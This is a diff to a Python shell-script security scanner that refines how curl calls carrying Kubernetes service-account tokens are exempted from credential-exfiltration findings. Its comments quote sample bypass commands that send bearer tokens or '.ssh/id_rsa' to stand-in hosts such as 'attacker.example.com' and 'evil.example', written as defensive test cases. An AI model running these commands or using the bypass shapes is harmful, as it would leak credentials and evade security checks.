@@ -27,6 +27,8 @@ import weakref
 from collections import namedtuple
 from urllib.parse import urlparse
 
+from . import curlargv as _curlargv
+from . import shellwords as _shellwords
 from . import shippedexec as _shippedexec
 from .scanbudget import ScanBudgetExceeded
 
@@ -1366,6 +1368,38 @@ _INCLUSTER_API_HOST_ANCHORED_RE = re.compile(
     r"|[A-Za-z0-9_.-]*\.svc\.cluster\.local"
     r"|\$\{?KUBERNETES_SERVICE_HOST\}?"
     r")(?::(?:\d+|\$\{?KUBERNETES_SERVICE_PORT\}?))?(?:[/?].*)?$",
+    re.I,
+)
+# B-986 (Dave's decision 2): the SAME closed host allowlist as
+# above, but for the NEW real-positional-argv-parsed shell exemption
+# (`_sh_incluster_dest_word_is_safe` below) -- scheme is REQUIRED to be
+# literally `https://`, never optional/`http://`/scheme-less. This is
+# deliberately a SEPARATE constant from `_INCLUSTER_API_HOST_ANCHORED_RE`
+# (which stays optional-scheme, unchanged, for its own existing callers --
+# `_sh_var_mentions_incluster_host` resolves a bare shell VARIABLE'S OWN
+# value, which legitimately has no scheme of its own when the scheme is
+# spliced in separately at the call site, e.g. `API_SERVER="kubernetes.
+# default.svc"` used as `"https://${API_SERVER}/..."` -- narrowing that
+# shared regex to require https:// would wrongly fail closed on that
+# ordinary idiom). This new regex is applied to the DEST WORD'S OWN fully
+# node-substituted text (see `_sh_incluster_dest_word_is_safe`), where the
+# scheme -- if any -- is always part of that same word's literal text. The
+# trailing path group is `\S*`, not `.*` (unlike its optional-scheme twin
+# above): B-986 N16 -- a resolved variable's value can land on
+# a whitespace-joined SECOND https:// URL (an unquoted `$URLS` holding two
+# space-separated destinations, IFS-split into two argv words by a real
+# shell at runtime but seen here as one already-resolved string) -- `.*`
+# would happily swallow the space and the second URL as if it were an
+# ordinary path/query string. `_sh_incluster_dest_word_is_safe`'s own
+# `_sh_incluster_dest_text_matches` helper ALSO checks for whitespace
+# explicitly before ever reaching this regex, so this is belt-and-suspenders
+# rather than the sole guard.
+_INCLUSTER_DEST_WORD_HTTPS_RE = re.compile(
+    r"^https://(?:"
+    r"kubernetes\.default(?:\.svc(?:\.cluster\.local)?)?"
+    r"|[A-Za-z0-9_.-]*\.svc\.cluster\.local"
+    r"|\$\{?KUBERNETES_SERVICE_HOST\}?"
+    r")(?::(?:\d+|\$\{?KUBERNETES_SERVICE_PORT\}?))?(?:[/?]\S*)?$",
     re.I,
 )
 # B-422 (C-348 adversarial review): "put"/"patch"/"request" are common
@@ -14502,11 +14536,10 @@ _SH_CRED_ASSIGN_RE = re.compile(
 #      genuinely transmitted, so a generic credential (.ssh/.aws/etc.) or an
 #      attacker-controlled destination must never qualify.
 _SH_TLS_MATERIAL_FLAG_RE = re.compile(r"(?:--cacert|--capath|--cert|--key|-E)\s+")
-_SH_AUTH_HEADER_RE = re.compile(r"(?:-H|--header)\s+(['\"])\s*Authorization\s*:.*?\1", re.I)
 # ANY -H/--header value (not just Authorization) -- used to blank header text out
 # of the destination search below, not to detect a credential match.
 _SH_ANY_HEADER_VALUE_RE = re.compile(r"(?:-H|--header)\s+(['\"]).*?\1", re.I)
-# B-985: `_sh_var_mentions_incluster_host` below runs this against `masked`, the
+# B-985: `_sh_resolve_var_literal` below runs this against `masked`, the
 # WHOLE (comment-blanked) multi-line script buffer -- it needs every physical
 # line's own `VAR=...` assignment to match, not just one at the absolute start
 # of the buffer. Without `re.MULTILINE`, `^`/`$` anchor to the start/end of the
@@ -14588,10 +14621,10 @@ def _sh_resolve_var_literal(masked: str, name: str) -> "str | None":
         `${...}`, `${...:-...}` default expansion, `$(...)` command
         substitution, or a backtick substitution).
 
-    This is the single fail-closed primitive both the shell-side in-cluster-host
-    check (`_sh_var_mentions_incluster_host`) and `_vet.py`'s B-748 cross-skill
-    "own known destination" exemption fallback build on -- so the two can never
-    drift apart on what counts as "safely resolved"."""
+    This is the single fail-closed primitive both `_sh_incluster_dest_word_is_safe`
+    (the shell-side in-cluster-destination-word check) and `_vet.py`'s B-748
+    cross-skill "own known destination" exemption fallback build on -- so the
+    two can never drift apart on what counts as "safely resolved"."""
     if _sh_var_binding_count(masked, name) != 1:
         return None
     matches = [m for m in _SH_VAR_ASSIGN_RE.finditer(masked) if m.group("var") == name]
@@ -14612,26 +14645,6 @@ def _sh_resolve_var_literal(masked: str, name: str) -> "str | None":
     if "$" in val or "`" in val:
         return None
     return val
-
-
-def _sh_var_mentions_incluster_host(masked: str, name: str) -> bool:
-    """True only when `name`'s SOLE binding anywhere in the WHOLE script is a
-    bare `VAR=value` literal (see `_sh_resolve_var_literal` -- fails closed on
-    any reassignment, export/local/declare, read, or for-loop binding, and on
-    any still-dynamic value) whose value is HOST-ANCHORED (not merely
-    containing the pattern anywhere) to the cluster's own in-cluster API
-    server.
-
-    B-985: hardened from an unanchored `search()` over every
-    top-level assignment line (`finditer` returning True on the FIRST
-    matching line, regardless of how many OTHER bindings of the same name
-    existed) -- that let a REASSIGNED variable, a `${VAR:-<safe-default>}`
-    decoy, or an attacker host that merely CONTAINS the host pattern in its
-    path read as "still resolves to the safe host"."""
-    literal = _sh_resolve_var_literal(masked, name)
-    if literal is None:
-        return False
-    return bool(_INCLUSTER_API_HOST_ANCHORED_RE.match(literal))
 
 
 def _sh_line_destination_text(raw: str) -> str:
@@ -14676,113 +14689,6 @@ def _sh_candidate_destination_tokens(text: str) -> list:
     return tokens
 
 
-def _sh_line_has_incluster_destination(raw: str, masked: str) -> bool:
-    """True if a candidate destination TOKEN (see `_sh_candidate_destination_tokens`)
-    in the non-header, non-TLS-flag part of *raw* -- or a variable it references
-    (resolved against the whole script's simple `VAR=...` assignments) -- mentions
-    the cluster's own API server. Fails closed: an unresolvable variable, an
-    opaque expression, or text that isn't even URL/variable-shaped is simply not
-    a match, so the finding stays crit.
-
-    B-912 round 2 (C-135, reviewer-found): curl sends the SAME flags -- including a
-    stolen Authorization header -- to EVERY destination argument on its command line
-    (unless `--next` separates them, which this rule does not special-case). Granting
-    the exemption because SOME ONE candidate token among several resolves in-cluster
-    said nothing about the OTHERS: a decoy in-cluster URL placed alongside a genuinely
-    attacker-controlled one (`curl -H "Authorization: Bearer $TOKEN"
-    https://kubernetes.default.svc/decoy https://attacker.example.com/steal`) is a
-    real, functioning exfil shape, not a false alarm -- curl requests both, with the
-    same header. This bug pre-dates B-912's continuation-join (it already evaded on a
-    single physical line); the join only widened how often ordinary multi-line
-    formatting reaches it. Now fails closed on token COUNT too: the exemption
-    requires EXACTLY ONE candidate destination token on the line, and that one must
-    resolve to the cluster's own API server -- two or more candidate tokens never
-    qualify, regardless of how many of them are individually in-cluster."""
-    dest_text = _sh_line_destination_text(raw)
-    tokens = _sh_candidate_destination_tokens(dest_text)
-    if len(tokens) != 1:
-        return False
-    tok = tokens[0]
-    # B-985 companion: anchored, not a bare `search()` -- a literal
-    # token that merely CONTAINS the host pattern in its path
-    # (`https://attacker.example.com/kubernetes.default.svc`) must not confirm
-    # the destination.
-    if _INCLUSTER_API_HOST_ANCHORED_RE.match(tok):
-        return True
-    for name in _SH_VAR_REF_RE.findall(tok):
-        if _sh_var_mentions_incluster_host(masked, name):
-            return True
-    return False
-
-
-def _sh_cred_match_is_incluster_auth_only(
-    raw: str, masked: str, *, all_incluster_token: "bool | None" = None
-) -> bool:
-    """B-415/C-135: True only when EVERY `_SH_CRED_FILE_RE` match on *raw* is
-    either (a) inside curl's own TLS-material flag argument (--cacert/--capath/
-    --cert/--key/-E -- read locally for the handshake, never sent as request
-    data), or (b) the narrow in-cluster service-account token specifically,
-    referenced ONLY inside a -H/--header 'Authorization: ...' value, on a line
-    whose own destination resolves to the cluster's own API server. A
-    credential-path match ANYWHERE ELSE -- the URL, -d/--data body, a
-    non-Authorization header, or a bare unflagged argument -- makes this return
-    False, so the exemption can never launder a real exfil position. A generic
-    secrets-mount or dotfile credential (not the exact service-account token
-    path) never qualifies for (b), at any position or destination -- only the
-    TLS-flag case (a) can ever apply to it.
-
-    `all_incluster_token` (B-894 round 4, loop DIRECT role only): when not
-    None, replaces the per-match `_INCLUSTER_TOKEN_PATH_RE` content test on
-    *m.group(0)* with this precomputed, whole-word-list verdict. The loop role
-    substitutes a single representative word for cost reasons (round 2) before
-    calling this function; the TLS-material-flag arm above is sound to check
-    with any one word since it never reads word content, but the in-cluster-
-    token arm DOES read the substituted word's own text, so a representative
-    word can only stand in for the FULL word list when every word in it is
-    independently the in-cluster token path -- never for one word picked out of
-    a MIXED list. Round 3's review found that padding a real credential path's
-    loop word list with the harmless in-cluster token path made `min(file_words)`
-    pick the token, exempting the whole line and laundering the real credential
-    past this crit rule. Passing this keeps the exemption decided by one
-    function for both the literal and loop forms (single source of truth) while
-    letting the loop caller supply a content verdict it computed once per region
-    instead of once per word."""
-    matches = list(_SH_CRED_FILE_RE.finditer(raw))
-    if not matches:
-        return False
-    auth_header_spans = [m.span() for m in _SH_AUTH_HEADER_RE.finditer(raw)]
-    destination_ok: bool | None = None
-    for m in matches:
-        prefix = raw[: m.start()]
-        flag_matches = list(_SH_TLS_MATERIAL_FLAG_RE.finditer(prefix))
-        is_tls_flag_arg = False
-        if flag_matches:
-            between = prefix[flag_matches[-1].end() :]
-            # The match must still be the SAME shell word the flag introduced --
-            # no whitespace/segment-separator between the flag and the match
-            # (the credential-path regex can match a SUFFIX of the path token,
-            # e.g. the .../ca.crt case below, not always its very first char).
-            if not re.search(r"[\s;&|]", between):
-                is_tls_flag_arg = True
-        if is_tls_flag_arg:
-            continue
-        is_incluster_token = (
-            bool(_INCLUSTER_TOKEN_PATH_RE.search(m.group(0)))
-            if all_incluster_token is None
-            else all_incluster_token
-        )
-        in_auth_header = any(
-            start <= m.start() and m.end() <= end for start, end in auth_header_spans
-        )
-        if is_incluster_token and in_auth_header:
-            if destination_ok is None:
-                destination_ok = _sh_line_has_incluster_destination(raw, masked)
-            if destination_ok:
-                continue
-        return False
-    return True
-
-
 def _sh_word_is_incluster_token(word: str) -> bool:
     """B-894 round 4: True only when `_SH_CRED_FILE_RE`'s OWN match WITHIN *word*
     (not *word* itself) is the in-cluster token path -- the same text
@@ -14798,9 +14704,475 @@ def _sh_word_is_incluster_token(word: str) -> bool:
     word instead of `_SH_CRED_FILE_RE`'s own match would silently exempt that one
     spelling inside a loop while the literal form still convicts it -- a
     loop-broader-than-literal gap the design's own invariant forbids (found while
-    verifying the round-4 fix, before it shipped -- never observed by a reviewer)."""
+    verifying the round-4 fix, before it shipped -- never observed by a reviewer).
+
+    B-986 round 3 (independent C-135 review of 63fcecd1, BLOCKER):
+    `.search()` only ever returns `_SH_CRED_FILE_RE`'s FIRST match within *word*,
+    silently ignoring that a single shell word (no whitespace required between two
+    `_SH_CRED_FILE_RE` alternatives) can contain a SECOND, independent match right
+    after the first. Repro: the loop word
+    `/var/run/secrets/kubernetes.io/serviceaccount/token.ssh/id_rsa` -- the exact
+    in-cluster token path with `.ssh/id_rsa` glued on, no separator -- makes
+    `.search()` return only the token alternative (span ending at `...token`,
+    `m.group(0)` = the pure token, which `_INCLUSTER_TOKEN_PATH_RE` of course
+    matches), never reaching the SECOND match `.ssh/id_rsa` (a real, unrelated
+    credential file) that `finditer()` reveals starting exactly where the first
+    match stops. This function then wrongly certified the whole word as a "pure"
+    in-cluster token, which the caller (`region_all_incluster_token` in the loop
+    DIRECT role) folds into a blanket `all_incluster_token=True` passed to
+    `_sh_line_incluster_exemption` -- bypassing that function's own per-match
+    `_INCLUSTER_TOKEN_PATH_RE` content check for EVERY `_SH_CRED_FILE_RE` match on
+    the substituted line, including the `.ssh/id_rsa` one, so the whole line went
+    unconvicted (0 findings). The literal (non-loop) form of the same substituted
+    text was never affected -- it always calls `_sh_line_incluster_exemption` with
+    `all_incluster_token=None`, which checks each match independently and
+    correctly refuses the `.ssh/id_rsa` match. Fix: a word counts as the in-cluster
+    token ONLY when `_SH_CRED_FILE_RE`'s match consumes the ENTIRE word (`m.start()
+    == 0 and m.end() == len(word)`) -- i.e. the word IS the token, nothing else is
+    glued onto either end -- so a second (or leading) credential-shaped match
+    anywhere in the same word can no longer hide behind the first one. Verified
+    against every existing word shape this function is pinned against (the pure
+    token, the no-`var/`-prefix spelling, `~/.aws/credentials`,
+    `~/.config/.../wallet.dat`): only the pure token still returns True."""
     m = _SH_CRED_FILE_RE.search(word)
-    return bool(m) and bool(_INCLUSTER_TOKEN_PATH_RE.search(m.group(0)))
+    return (
+        bool(m)
+        and m.start() == 0
+        and m.end() == len(word)
+        and bool(_INCLUSTER_TOKEN_PATH_RE.search(m.group(0)))
+    )
+
+
+# ============================================================================
+# B-986: real positional-argv-parsed exemption for the LITERAL
+# (non-loop) SHELL_CRED_EXFIL path.
+#
+# Two blocked prior rounds each tried to make `_sh_cred_match_is_incluster_
+# auth_only` / `_sh_line_has_incluster_destination` above sound by ENUMERATING
+# curl's flag surface (which flags take a "position not destination" value,
+# regexes for a bare host vs IPv6, etc) -- both were independently found
+# BLOCKER-unsound by adversarial review (real bypasses: no HOP-flag
+# recognition at all, e.g. `-x https://proxy` counted as clean by accident of
+# the old naive token-scan; ambiguous scheme-less handling; a glued `-oFILE`
+# value scanned as if it might be a destination). Dave's decision: stop
+# enumerating, do real positional argv parsing instead (shellwords.py +
+# curlgrammar.py + curlargv.py).
+#
+# Scope, exactly as decided:
+#   1. ANY HOP-role option (proxy/socks/preproxy/connect-to/resolve/dns-*/
+#      doh-url/unix-socket/ipfs-gateway) anywhere on the line UNCONDITIONALLY
+#      refuses -- no conditional https-through-proxy carve-out.
+#   2. https:// is REQUIRED for the exemption -- scheme-less/http:// destin-
+#      ation handling is dropped entirely (see `_INCLUSTER_DEST_WORD_HTTPS_RE`
+#      above).
+#   3. Script-level refusal rules (curl-function-shadowing, curl's own
+#      ENVIRONMENT variable list, curlrc, env-var BINDING tracking) are OUT
+#      of scope -- a sibling ticket. `_sh_line_incluster_exemption` below
+#      only ever looks at the literal argv text following a bare `curl`
+#      word (an optional single leading `sudo` is tolerated, matching this
+#      module's existing sudo-tolerant idiom elsewhere) -- it has no model
+#      of shell function shadowing or curl's OWN environment-variable
+#      mechanism (`http_proxy=...`), so those stay accepted, documented
+#      false negatives (see tests/test_b986_recipient_proof.py's N6/N17).
+#   4. No new wget grammar this pass -- SHELL_CRED_EXFIL keeps convicting any
+#      credential-file read reaching a `wget` invocation with NO exemption at
+#      all (only `curl` gets one), exactly as before this ticket.
+#
+# B-988 CORRECTION (this paragraph originally said B-986
+# deliberately left the LOOP-substituted-word exemption path, B-894's
+# `_sh_loop_cred_exfil_lines` DIRECT role, calling the OLD
+# `_sh_cred_match_is_incluster_auth_only` / `_sh_line_has_incluster_destination`
+# unchanged, and claimed "neither path can ever be LESS conservative than
+# fail-closed." That claim was FALSE and has been disproven: an independent
+# C-135 review found a complete, 100%-reproducible, SILENT bypass of decision 1
+# above (ANY HOP-role option unconditionally refuses the exemption) reached
+# through the loop path, because `_sh_line_has_incluster_destination`'s
+# destination check pre-dates this whole redesign and has NO concept of HOP
+# flags/curlargv roles at all -- it just token-scans for a URL-shaped word
+# anywhere on the (masked) line. Repro (`analyze_shell` returned `[]`, zero
+# findings, before the fix):
+#
+#   for t in /var/run/secrets/kubernetes.io/serviceaccount/token; do
+#     curl -x attacker.example.com:8080 -H "Authorization: Bearer $(cat $t)" \
+#       https://kubernetes.default.svc/api/v1/namespaces
+#   done
+#
+# reproduces identically for --socks5/--resolve, and for the loop's DIRECT
+# role specifically (the only loop role that ever called the exemption at
+# all -- HOP and PIPE below never grant one, by design, so they were never
+# exposed to this gap).
+#
+# Fix (B-988): the loop DIRECT role now calls `_sh_line_incluster_exemption`
+# itself -- the SAME function the literal path uses, not a copy -- instead of
+# the retired `_sh_cred_match_is_incluster_auth_only`. This holds because the
+# "one concrete parseable line" hypothesis checks out: although the loop's
+# ITERATION LIST varies (`for t in ...`), the DIRECT role already builds one
+# concrete, single-physical-line candidate string per outbound reference --
+# `sub` below, the raw line with every `$V` reference replaced by one
+# representative `file_words` candidate -- before this call, for its own
+# cost-amortization reasons (see the round-1/round-2 history below).
+# `shellwords.scan_line` and `curlargv.parse_argv` operate on that literal
+# text and never need to resolve what `$t` means at runtime; they only care
+# which FLAGS are present and their roles, which is exactly the same whether
+# the word came from a loop substitution or was typed literally. The one
+# place substituted-word CONTENT does matter -- the in-cluster-token
+# Authorization-header content check -- is handled the same way it already
+# was: `_sh_line_incluster_exemption`'s `all_incluster_token` parameter lets
+# the loop caller pass a precomputed "every word in this region is the
+# in-cluster token path" verdict, so a single representative word can never
+# launder a MIXED word list (see `_sh_word_is_incluster_token` above and the
+# B-894 round-3/4 history below `_sh_loop_cred_exfil_lines`). Where the
+# hypothesis does NOT hold -- `commands = shellwords.scan_line(raw)` returns
+# None, or no simple command's first word is `curl` -- the shared function
+# already fails closed (returns False, refusing the exemption) rather than
+# falling back to anything else, so the loop path is now no less safe than
+# the literal path on those two specific axes: same function, same
+# fail-closed default, same scope-1-4 rules above, on both call sites.
+# CORRECTION (round 5): this paragraph originally went on to claim that,
+# because there is exactly one exemption engine, "the two paths cannot
+# disagree by construction." That is an overclaim -- sharing one DECISION
+# function does not make the two paths' INPUT to it equivalent. Round 5
+# found a real disagreement: the loop role's own pre-substitution step (the
+# DIRECT-role splice, not this function) could still construct text this
+# shared function had never seen from the literal path -- a certified token
+# glued onto dangling operator syntax -- and reach a verdict the literal
+# path never would. See the round-5 history block above
+# `_sh_loop_cred_exfil_lines` for the actual fix (`shellwords.param_refs`
+# plus the `operator_ref_spans` refusal below). `_sh_cred_match_is_incluster_
+# auth_only` / `_sh_line_has_incluster_destination` /
+# `_sh_var_mentions_incluster_host` -- unreferenced by any call site since
+# this fix -- were removed as part of the round-5 change (they were flagged
+# here as a follow-up dead-code removal; this is that follow-up).
+_SH_ENV_PREFIX_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
+
+
+def _sh_incluster_dest_word_is_safe(word_text: str, masked: str) -> bool:
+    """True only when *word_text* (one curl argv word's raw text, exactly as
+    `curlargv.parse_argv` handed it back -- quotes intact) matches
+    `https://<in-cluster-host>[:port][/path]` under the checks below: at most
+    one variable reference in the word (two or more fails closed outright --
+    see the "no variable/glob/brace ambiguity" paragraph just below), and
+    that one reference (if any) resolved via `_sh_resolve_var_literal`'s own
+    fail-closed single-binding rule. NOT a guarantee against every possible
+    ambiguity: like the DIRECT role's own splice (see the round-5 history
+    block above `_sh_loop_cred_exfil_lines`), this function's single-reference
+    substitution (`_sh_loop_ref_re(name).subn(...)` below) is BARE-reference
+    only -- a parameter-expansion operator in the word (`${var%%x}` and
+    siblings) is out of scope for this check (CLAWSECCHECK decision 4 /
+    the R-4 follow-up: a destination-word operator bypass is a known,
+    deliberately unaddressed gap here, tracked separately from the
+    Authorization-header-value round-5 fix this module's `param_refs`
+    classifier closed).
+
+    A word with NO variable reference at all must match
+    `_INCLUSTER_DEST_WORD_HTTPS_RE` directly (covers a literal
+    `https://kubernetes.default.svc/...`/`...svc.cluster.local` destination,
+    and the well-known literal `https://$KUBERNETES_SERVICE_HOST/...`
+    spelling used with NO local binding of that name anywhere in the script
+    -- see below). Two or more variable references anywhere in the word
+    fails closed outright -- this is the "no variable/glob/brace ambiguity
+    in the host portion" requirement.
+
+    A word with EXACTLY ONE variable reference is handled one of two ways:
+      * `$KUBERNETES_SERVICE_HOST`/`${KUBERNETES_SERVICE_HOST}` with ZERO
+        bindings anywhere in the script (`_sh_var_binding_count` -- never
+        locally assigned/exported/read/for-bound; the ordinary case, since a
+        pod's own runtime environment injects this name and a legitimate
+        script never touches it) is trusted at face value, matched directly.
+        A NON-zero binding count means the script itself has (re)bound this
+        name -- B-986 N7: `KUBERNETES_SERVICE_HOST=attacker....`
+        followed by `"https://$KUBERNETES_SERVICE_HOST/..."` must NOT be
+        trusted just because the literal env-var NAME is the trusted one --
+        falls through to the general resolver below instead, exactly like
+        any other variable name.
+      * Any other name (or `KUBERNETES_SERVICE_HOST` WITH a binding):
+        resolved via `_sh_resolve_var_literal` (the existing B-985
+        fail-closed single-binding resolver -- 2+ bindings of any kind, or a
+        still-dynamic value, already yields None), substituted in, and
+        re-matched.
+
+    Either way, the final candidate text is rejected outright if it contains
+    ANY whitespace (B-986 N16: an unquoted `$URLS` holding TWO
+    space-joined https:// URLs is IFS-split into two argv words by a REAL
+    shell at runtime, which this module's static analysis does not
+    simulate -- it still sees one argv word. Resolving that one word's
+    variable value can still land on a multi-URL string containing a space,
+    which `_INCLUSTER_DEST_WORD_HTTPS_RE`'s own trailing `[/?]\\S*` path
+    group already excludes -- this check makes that explicit and covers the
+    literal-word path too, not just the substituted one, since a quoted word
+    can also legitimately contain a literal space in its own right).
+
+    curl's OWN `{a,b}`/`[a-z]` URL-globbing (a real curl feature operating on
+    the literal argument text regardless of shell quoting -- confirmed
+    directly: bash does not brace/glob-expand inside double quotes, so a
+    shell-quoted `"https://{a,b}/x"` still reaches curl as one argument,
+    which CURL then glob-expands into two requests unless `-g`/`--globoff`
+    is given) is never modeled or special-cased here -- it simply can never
+    match the closed host alternation, so any such ambiguity already fails
+    this check by construction."""
+    text = word_text
+    if len(text) >= 2 and text[0] == text[-1] and text[0] in "'\"":
+        text = text[1:-1]
+
+    names = _SH_VAR_REF_RE.findall(text)
+    if len(names) > 1:
+        return False
+    if not names:
+        return _sh_incluster_dest_text_matches(text)
+
+    name = names[0]
+    if name == "KUBERNETES_SERVICE_HOST" and _sh_var_binding_count(masked, name) == 0:
+        return _sh_incluster_dest_text_matches(text)
+
+    literal = _sh_resolve_var_literal(masked, name)
+    if literal is None:
+        return False
+    substituted, count = _sh_loop_ref_re(name).subn(literal, text, count=1)
+    if count != 1:
+        return False
+    return _sh_incluster_dest_text_matches(substituted)
+
+
+def _sh_incluster_dest_text_matches(text: str) -> bool:
+    if any(c.isspace() for c in text):
+        return False
+    return bool(_INCLUSTER_DEST_WORD_HTTPS_RE.match(text))
+
+
+def _sh_auth_header_value_is_authorization(value_text: "str | None") -> bool:
+    """True when an AUTH_HEADER-role token's *value_text* (curlargv's -H/
+    --header value, quotes intact) is itself an `Authorization: ...` header
+    -- mirrors the old `_SH_AUTH_HEADER_RE`'s own content requirement, so a
+    -H flag naming some OTHER header (Host/X-Decoy/...) never qualifies."""
+    if not value_text:
+        return False
+    text = value_text
+    if len(text) >= 2 and text[0] == text[-1] and text[0] in "'\"":
+        text = text[1:-1]
+    return bool(re.match(r"\s*Authorization\s*:", text, re.I))
+
+
+def _sh_command_text_is_outbound(raw: str, words: "tuple") -> bool:
+    if not words:
+        return False
+    span = raw[words[0].start : words[-1].end]
+    return bool(_SH_OUTBOUND_RE.search(span) or _sh_bare_nc_invocation(span))
+
+
+def _sh_line_incluster_exemption(
+    raw: str,
+    masked: str,
+    *,
+    all_incluster_token: "bool | None" = None,
+    operator_ref_spans: tuple = (),
+) -> bool:
+    """B-986: the real, positional-argv-parsed exemption engine, shared by
+    BOTH the LITERAL (non-loop) call site in `analyze_shell` below AND (since
+    B-988) the loop DIRECT role in `_sh_loop_cred_exfil_lines` --
+    there is now exactly one function that ever grants this exemption, on
+    either path. True only when EVERY `_SH_CRED_FILE_RE` match on *raw* is
+    either (a) inside a TLS_MATERIAL-role option's own value (read locally
+    for the TLS handshake, never sent as request data, regardless of
+    destination -- position-only, exactly like the old rule), or (b) the
+    narrow in-cluster service-account token specifically, inside an
+    Authorization-header value, on a curl invocation that ALSO satisfies
+    every one of: no HOP/CONFIG/UNKNOWN-role option anywhere in its own
+    argv; no OTHER outbound command on the line; at most one MIRROR-role
+    option, and only when the line is a single command; exactly one DEST-
+    role word in its own argv; and that DEST word passes
+    `_sh_incluster_dest_word_is_safe`. Fails closed (False) on anything
+    `shellwords.scan_line` cannot parse, or on a line where no simple
+    command's first word (optionally after one leading `do` -- B-988, a
+    one-line loop body's own keyword, see below -- and/or one leading
+    `sudo`) is literally "curl" -- see the module comment above this
+    function for the exact scope this covers and does not.
+
+    `all_incluster_token` (B-988, loop DIRECT role only -- mirrors the
+    retired `_sh_cred_match_is_incluster_auth_only`'s own parameter of the
+    same name): when not None, replaces the per-match
+    `_INCLUSTER_TOKEN_PATH_RE` content test on *m.group(0)* with this
+    precomputed, whole-word-list verdict. The loop caller substitutes a
+    single representative word into *raw* before calling this function for
+    cost reasons; that substitution is sound for every POSITION-only check
+    here (TLS_MATERIAL span, HOP/CONFIG/UNKNOWN roles, MIRROR count, DEST
+    role/shape) since none of those read the substituted word's own text --
+    but the in-cluster-token content test DOES read it, so a single
+    representative word can only stand in for the caller's FULL word list
+    when every word in it is independently the in-cluster token path, never
+    for one word picked out of a MIXED list (padding a real credential path
+    with the harmless token path, which sorts first, would otherwise let the
+    representative word alone launder the whole line -- see B-894 round 3/4
+    history above `_sh_word_is_incluster_token`). Passing this keeps the
+    decision made by this one function for both call sites while letting the
+    loop caller supply a content verdict it computed once per region instead
+    of once per line.
+
+    `operator_ref_spans` (B-986 round 5, loop DIRECT role only):
+    each span is a parameter-expansion OPERATOR reference to the loop
+    variable (`${var%%x}`, `${var/x/y}`, `${var:-}`, ...) the caller copied
+    through *raw* UNCHANGED rather than splicing a representative word into
+    (see `shellwords.param_refs` and the DIRECT-role splice loop in
+    `_sh_loop_cred_exfil_lines`) -- `raw`'s own coordinates, same as `matches`
+    above. Decision 1 (Dave): fail-closed-convict. Every span here MUST sit
+    entirely inside a TLS-material value's own span (and, per decision 2 /
+    P3b below, not overlap a `cmdsub` Part within it -- see
+    `tls_material_cmdsub_spans`); any span that does not refuses the
+    exemption outright (`return False`), regardless of what `_SH_CRED_FILE_RE`
+    finds (or fails to find) in the now-unmodified surrounding text. This is
+    deliberately broader than "does this specific operator change the
+    credential's value at runtime" -- a static scanner cannot answer that
+    without evaluating the shell, so it fails closed on the reference SHAPE
+    alone (an accepted, documented residual: `${var##*/}` -- a genuine no-op
+    for a bare token with no leading path components -- refuses the same as
+    an operator that actually rewrites the value; see
+    `tests/test_b894_shell_loop_cred_taint.py`'s G-7 rows). The default `()`
+    is exactly "no operator references found" -- the ordinary case, and the
+    ONLY case the literal (non-loop) call site in `analyze_shell` below ever
+    passes, since there is no splicing at all on that path for an operator
+    reference to arise from."""
+    matches = list(_SH_CRED_FILE_RE.finditer(raw))
+    if not matches and not operator_ref_spans:
+        return False
+
+    commands = _shellwords.scan_line(raw)
+    if commands is None:
+        return False
+
+    curl_cmd = None
+    curl_argv: tuple = ()
+    for cmd in commands:
+        words = cmd.words
+        if not words:
+            continue
+        idx = 0
+        # B-988: tolerate a single leading `do` -- `shellwords.
+        # scan_line` has no concept of shell reserved words, so a one-line loop
+        # body sharing its physical line with `do` (`for c in ...; do curl
+        # --cert "$c" https://...; done`, the B-936 idiom) hands this function a
+        # raw line whose first WORD is literally "do", not "curl". Both callers
+        # can produce this shape: the loop DIRECT role in
+        # `_sh_loop_cred_exfil_lines` only ever substitutes a loop variable's
+        # value into an otherwise-untouched physical line, and the literal
+        # per-line scan in `analyze_shell` can reach the very same physical
+        # text when a LITERAL (non-loop-var) credential path sits directly in a
+        # one-line loop body. Either way `do` here is genuine shell syntax, not
+        # attacker content (`shellwords` already isolated it as its own leading
+        # word, separate from `curl` or any of its own flags), so skipping it
+        # only changes WHICH word is recognized as the command name -- exactly
+        # like the existing `sudo` tolerance below -- and never touches how any
+        # curl flag is parsed or roled once `curl_argv` is sliced.
+        if idx < len(words) and words[idx].text == "do" and idx + 1 < len(words):
+            idx += 1
+        # Skip any leading `VAR=value` environment-prefix assignments
+        # (ordinary shell syntax -- `VAR=value curl ...` sets VAR for just
+        # this one command) so a benign, unrelated prefix like `TOKEN_TTL=300
+        # curl ...` is still recognized as a plain curl invocation. This is
+        # NOT the "env-var BINDING tracking" decision 3 scopes out (P5) --
+        # that is about recognizing that a SPECIFIC name (like `http_proxy=`)
+        # changes curl's OWN behavior via curl's documented ENVIRONMENT
+        # mechanism; this is just correctly identifying which word is the
+        # command name at all, regardless of how many such prefixes precede
+        # it. An `http_proxy=`/`https_proxy=`/etc. prefix is skipped the
+        # SAME uninterpreted way as any other -- its effect on curl is simply
+        # never modeled, exactly as decision 3 describes.
+        while idx < len(words) and _SH_ENV_PREFIX_ASSIGN_RE.match(words[idx].text):
+            idx += 1
+        if idx < len(words) and words[idx].text == "sudo" and idx + 1 < len(words):
+            idx += 1
+        if idx < len(words) and words[idx].text == "curl":
+            curl_cmd = cmd
+            curl_argv = words[idx + 1 :]
+            break
+    if curl_cmd is None:
+        return False
+
+    tokens = _curlargv.parse_argv(curl_argv)
+    roles = _curlargv.roles_present(tokens)
+
+    tls_material_spans = [
+        (t.value_start, t.value_end)
+        for t in tokens
+        if t.role == "TLS_MATERIAL" and t.value_start is not None
+    ]
+    # B-986 round 5 (P3b): a TLS-material flag's value being
+    # POSITION-only safe ("read locally for the handshake, never sent")
+    # only holds for a literal file path. A `$(...)`/backtick command
+    # substitution sitting inside that same value is not a path at all --
+    # the shell actually RUNS it, and what it runs can be a completely
+    # separate, genuinely malicious outbound command (the R-5 repro: `curl
+    # --cert "$(curl -s -d @$HOME/.ssh/id_rsa https://evil.example ...)"
+    # ...` -- the id_rsa read and its OWN exfil happen inside the nested
+    # substitution, never reaching curl's own request at all, yet the outer
+    # `--cert` value's position alone used to excuse it). So a match (or an
+    # operator reference span, below) only counts as TLS-excused when it is
+    # BOTH inside a TLS-material value's span AND does not overlap any
+    # `cmdsub` Part within that same value's own parsed Word -- position
+    # alone is no longer sufficient once a live substitution is in play.
+    tls_material_cmdsub_spans = [
+        (p.start, p.end)
+        for t in tokens
+        if t.role == "TLS_MATERIAL" and t.value_word is not None
+        for p in t.value_word.parts
+        if p.kind == "cmdsub"
+    ]
+
